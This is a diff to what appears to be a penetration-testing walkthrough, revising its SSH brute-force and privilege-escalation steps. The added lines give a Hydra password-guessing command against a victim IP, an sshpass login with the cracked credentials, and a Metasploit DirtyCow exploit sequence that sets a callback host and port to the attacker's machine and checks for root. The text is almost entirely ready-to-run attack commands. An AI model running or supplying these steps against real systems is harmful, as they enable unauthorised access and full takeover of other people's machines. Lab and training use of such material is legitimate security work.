@@ -160,12 +160,19 @@ Ensure the following packages are installed:
 1. **Brute Force SSH Attack**:
    Execute Hydra:
    ```bash
-   hydra -L /path/to/user.txt -P /path/to/pass.txt ssh://<Target_IP> -t 4 -o results.txt
+   hydra -L /path/to/user.txt -P /path/to/pass.txt ssh://<Victim_IP> -t 4 -o results.txt
+   sshpass -p <The_Password> ssh <The_User>@<Victim_IP>
    ```
 2. **Privilege Escalation**:
    Use the DirtyCow exploit:
    ```bash
-   ./dirtycow
+   msfconsole
+   search dirtycow
+   use exploit/linux/local/dirtycow
+   set LHOST <your_ip>
+   set LPORT <your_port>
+   run
+   whoami
    ```
 3. **File and Directory Discovery**:
    ```bash
